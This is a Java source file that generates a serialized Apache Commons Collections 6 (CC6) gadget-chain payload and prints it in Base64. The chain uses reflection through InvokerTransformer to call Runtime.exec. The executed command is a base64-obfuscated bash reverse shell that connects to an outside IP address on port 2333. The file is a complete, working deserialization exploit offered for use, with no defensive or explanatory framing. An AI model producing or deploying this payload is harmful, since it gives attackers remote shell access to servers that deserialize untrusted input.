package top.foreverwl.cc6_v1.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: CC6_v1
 * @description:
 * @author: 168
 * @create: 2024-07-18 15:15
 **/
public class CC6_payload {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny43Ni4xNzEuMjQ3LzIzMzMgMD4mMQ==}|{base64,-d}|bash"})
        };
        Transformer[] facktransformer=new Transformer[]{new ConstantTransformer(1)};

        ChainedTransformer chainedTransformer = new ChainedTransformer(facktransformer);
        Map nomap=new HashMap();
        Map lazymap= LazyMap.decorate(nomap, chainedTransformer);

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap,"key1");
        HashMap<Object, Object> expmap = new HashMap<>();
        expmap.put(tiedMapEntry,"168");
        lazymap.remove("key1");
        Field f=ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformer);

        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        ObjectOutputStream stream1 = new ObjectOutputStream(stream);
        stream1.writeObject(expmap);
        stream1.close();
        String payload= Base64.getEncoder().encodeToString(stream.toByteArray());
        System.out.println(payload);



    }

}
